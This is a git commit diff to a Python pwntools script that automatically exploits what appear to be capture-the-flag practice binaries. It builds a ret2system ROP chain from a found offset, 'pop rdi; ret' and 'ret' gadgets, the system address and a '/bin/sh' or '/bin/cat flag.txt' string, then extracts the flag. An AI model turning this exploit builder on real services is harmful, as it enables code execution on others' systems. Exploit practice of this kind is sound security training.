a26e5c674b89360618787fb0b4829081db2eeb83
Joshua Hartzfeld <102620766+JoshuaHartz@users.noreply.github.com>
2023-12-02 01:10:09 -0500

    Add files via upload

--- ret2sys.py
+++ ret2sys.py
@@ -7,7 +7,14 @@ import re
 # logging.disable(logging.CRITICAL)
 
 # im aware this looks like trash but ill fix it in post
-
+context.update(
+    arch="amd64",
+    endian="little",
+    log_level="warning",
+    os="linux",
+    # terminal=["tmux", "split-window", "-h", "-p 65"]
+    terminal=["st"]
+)
 
 def exploit(binary: str):
     flag_regex = r'flag\{[^}]+\}'
@@ -21,27 +28,31 @@ def exploit(binary: str):
 
     p.recvuntil(b'>>>\n')
 
-    payload = b'complexity'
+    payload = b''
 
-    system = null
-    pop_rdi = null
 
     try:
         pop_rdi = (r.find_gadget(['pop rdi', 'ret']))[0]
+        ret = r.find_gadget(['ret'])[0]
         print(f"[+] Location of pop RDI : {hex(pop_rdi)}")
     except:
         print('[!] pop rdi; ret; not found')
+        pop_rdi = null
+        ret = null
         pass
 
     try:
         system = e.sym['system']
         print(f"[+] System Address: {hex(system)}")
     except KeyError:
+        system = null
         print('[!] System not found in a ret2system lol')
 
     offset = detection.find_rip_offset(binary)
     print("[+] Offset:", offset)
+
     payload += cyclic(offset)
+    payload += p64(ret)
     payload += p64(pop_rdi)
 
     try:
@@ -56,7 +67,7 @@ def exploit(binary: str):
         print('[!] bin/shell not found')
         try:
             cat = next(e.search(b'/bin/cat flag.txt'))
-            print(f"[+] Location of bin/cat flag.txt: {hex(cat)} {cat}")
+            print(f"[+] Location of bin/cat flag.txt: {hex(cat)}")
             payload += p64(cat)
             payload += p64(system)
             p.sendline(payload)
@@ -65,7 +76,7 @@ def exploit(binary: str):
             pass
 
     output = p.recvall(timeout=0.2)
-    print(f"output: {output}")
+    #print(f"output: {output}")
     flag = re.findall(flag_regex, output.decode())
     if flag:
         return flag[0]
@@ -77,7 +88,7 @@ def main():  # TEMP FOR TESTING
     for i in range(10):
         print(f"bin-ret2system-{i}")
         flag = exploit(f"bin-ret2system-{i}")
-        print(flag)
+        print(f"\n[!]{flag}\n")
 
 
 main()
